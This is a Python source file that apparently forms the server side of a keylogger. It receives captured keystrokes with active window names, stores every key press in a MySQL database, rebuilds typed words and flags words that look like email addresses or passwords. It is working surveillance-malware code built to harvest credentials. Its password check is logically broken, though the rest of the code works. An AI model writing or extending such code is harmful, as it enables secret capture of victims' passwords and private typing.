from load_config import load_cfg
import mysql.connector
import json

class Process:
    def __init__(self):
        self.word = ""
        self.payload = {
            "datetime": "",
            "epoch": "",
            "windowName": "",
            "processedWord":"",
            "isEmail": 0,
            "isPassword": 0
        }
        self.cfg = load_cfg('./main_cfg.json')
    
    #######################################
    #                                     
    #         Key Processing           
    #                                     
    #######################################
    
    def addKey(self, data):
        print(data)
        payload = json.loads(data)
        self.pushDB_keys(payload)
        self.appendWord(payload)
    
    def pushDB_keys(self,payload):
        db = mysql.connector.connect (
            host=self.cfg['dbHost'],
            port=self.cfg['port'],
            user=self.cfg['sqlUser'],
            password=self.cfg['sqlPass'],
            database=self.cfg['db']
        )
        
        mycursor = db.cursor()

        sql = f"INSERT INTO {self.cfg['dbKeyTable']} {self.cfg['dbRows']} VALUES (%s, %s, %s, %s, %s, %s,%s, %s, %s)"
        val = (f"{payload['datetime']}", f"{payload['epochTime']}", f"{payload['isKeyDown']}", f"{payload['windowName']}", f"{payload['asciiCode']}", f"{payload['asciiChar']}", f"{payload['keyName']}", f"{payload['isCaps']}", f"{payload['processedKey']}")
  
        mycursor.execute(sql, val)
        print(sql,val) 
        db.commit()
        mycursor.close()
        db.close()
        
        return 0
        
    #######################################
    #                                     
    #         Words Processing           
    #                                     
    #######################################
    '''
    This function appends characters to word
    If the character receieved is a space or return (i.e break char), then we push the word that we have collected to the words database
    - Also check that if the first key we recieve is a Space or return, that this is not pushed to database
    '''
    def appendWord(self,data):
        if (data['processedKey']):
            if (len(self.word) == 0):
                print("setting word payload WITH " + data['keyName'])
                self.payload['datetime'] = data['datetime']
                self.payload['epoch'] = data['epochTime']
                self.payload['windowName'] = data['windowName']
            self.word += data['processedKey']
        elif (self.payload['datetime'] != ""):
            #TODO: if last word, add the time pressed as end time
            print("HERE")
            self.payload['processedWord'] = self.word
            print(self.payload)
            #self.resetWord()
            self.checkEmailPassword()
            self.pushDB_word()
            
        return 0
        
  
    '''
    This function checks if the string processed is an email or a password
    
    For email: check if the string contains "@"
    For password: check if string is a mix of alphabet and numbers
    
    Future iterations, isPassword can be determined using a dictionary attack style comparison
    '''
    def checkEmailPassword(self):
        check_word = self.payload['processedWord']
        if "@" in check_word:
            self.payload['isEmail'] = 1
        
        elif (check_word.isalpha() and check_word.isdigit() and check_word != ""):
            self.payload['isPassword'] = 1
            

    def pushDB_word(self):
        db = mysql.connector.connect (
            host=self.cfg['dbHost'],
            port=self.cfg['port'],
            user=self.cfg['sqlUser'],
            password=self.cfg['sqlPass'],
            database=self.cfg['db']
        )
        
        mycursor = db.cursor()

        sql = f"INSERT INTO {self.cfg['dbWordTable']} {self.cfg['dbWordRows']} VALUES (%s, %s, %s, %s, %s, %s)"
        val = (f"{self.payload['datetime']}", f"{self.payload['epoch']}", f"{self.payload['windowName']}", f"{self.payload['processedWord']}",f"{self.payload['isEmail']}", f"{self.payload['isPassword']}")
        
        print(sql,val)
        mycursor.execute(sql, val)
        self.payload['processedWord'] = ""
        
        db.commit()    
        mycursor.close()
        db.close()
        
        self.resetWord() #clear word and payload for next incoming word processing
        return 0 
        
    def resetWord(self):
        self.word = ""
        self.payload = {
            "datetime": "",
            "epoch": "",
            "windowName": "",
            "processedWord":"",
            "isEmail": 0,
            "isPassword": 0
        }
        
    
    '''
    When the data is sent to main.py, it is immediate processed and passed key-by-key into process.py
    
    Individual key presses have are inserted in a key table in the MySQL database
    For each key press, it is appended to our temporary word cache, where on a break character (i.e. Return or Space),
    the cached word is appended to the word payload and this is inserted into the word table in the MySQL database.
    
    For each word, additional processing is completed:
    1. isEmail - checks if the string contains "@"
    2. isPassword - check if the string is a mixture of numbers and characters
    '''
    
